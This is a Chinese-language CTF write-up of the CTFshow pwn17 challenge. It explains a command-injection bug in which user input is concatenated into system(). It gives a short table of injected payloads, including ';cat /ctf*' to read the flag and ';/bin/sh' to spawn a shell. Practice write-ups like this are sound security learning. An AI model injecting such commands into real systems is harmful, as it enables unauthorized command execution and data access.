---
title: "[ pwn 学习 ] CTFshow-pwn17"
date: 2026-07-21 16:00:00
categories:
  - CTF
  - Pwn
tags:
  - CTF
  - Pwn
  - CTFShow
---

# 1. 基础信息

```python
checksec pwn17
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

64 位程序，保护全开。

# 2. 反编译分析

核心结构是一个菜单循环：

+ 选项 1：`system("id")` — 执行 id 命令
+ **选项 2：列出目录内容（可自定义目录）**
+ **选项 3：假装要打印 flag（烟雾弹）**
+ 选项 4：`sleep` + 认证失败提示
+ 选项 5：退出

值得关注的是 Case 2 和 Case 3。

# 3. 选项 3 — 烟雾弹

最终也能打印 flag，但要等 `sleep(0x1BF52u)` = 114514 秒 ≈ 31 小时，靶机早断连了。跳过。

# 4. 漏洞点 — 选项 2

```c
case 2:
    puts("Which directory?('/','./' or the directiry you want?)");
    read(0, buf, 0xAuLL);       // 从键盘读最多 10 字节
    strcat(dest, buf);          // 拼接到 dest 后面
    system(dest);               // 直接当作命令执行
    break;
```

## 4.1 变量定义

```c
char dest[4];        // 只能装 4 个字符，预存 "ls "
char buf[10];        // 能装 10 个字符
read(0, buf, 10);
strcat(dest, buf);   // buf 倒进 dest → 溢出！
```

| 写的 | 实际存的 |
| --- | --- |
| `"ls "` | l、s、空格、\0 |
| `/flag`（用户输入） | /、f、l、a、g |
| 拼接后 `"ls /flag"` | l、s、空格、/、f、l、a、g |

`dest` 只有 4 字节，`strcat` 从 `\0` 位置开始往后写。程序对用户输入零过滤，你输入什么就拼什么，然后直接喂给 `system()` 执行。

# 5. 攻击思路 — 分号截断命令注入

Linux shell 中 `;` 是命令分隔符：`cmd1;cmd2` 会依次执行两条命令。

构造 payload：

```c
;cat /ctf*
```

9 字符，满足 10 字节限制。拼接后 `dest` = `ls ;cat /ctf*`，`system()` 执行：① `ls` 列出目录 ② `cat /ctf*` 读取 flag。

（`*` 是通配符，只要 `/` 下 `ctf` 开头的文件唯一，就能精准匹配。）

具体操作：
1. 连上靶机，**输入 2**
2. 程序回显 `Which directory?`
3. **输入 `;cat /ctf*`**
4. 获得 flag

# 6. 更多可用的 payload

| Payload | 长度 | 效果 |
| --- | --- | --- |
| `;cat /ctf*` | 9 字节 | 直接输出 flag |
| `;/bin/sh` | 8 字节 | 弹交互式 shell |
| `;cat /f*` | 8 字节 | 用 f* 匹配更短 |
| `;ls /` | 5 字节 | 先探路 |

# 7. 此类漏洞思路

| 函数 | 为什么危险 |
| :---: | --- |
| `gets()` | 读取输入不限制长度，必溢出 |
| `strcpy()` / `strcat()` | 复制/拼接不检查长度 |
| `read()` | 第三个参数 > 缓冲区大小就溢出 |
| `scanf("%s", ...)` | 不限制输入长度 |
| `system()` / `execve()` | 参数可控 = 命令注入 |

构造 payload 注意：长度限制（本题 10 字节）、坏字符过滤等约束。命令注入用 `;` `|` `&&` 等截断原命令；栈溢出则计算偏移 → 覆盖返回地址 → ROP 链。
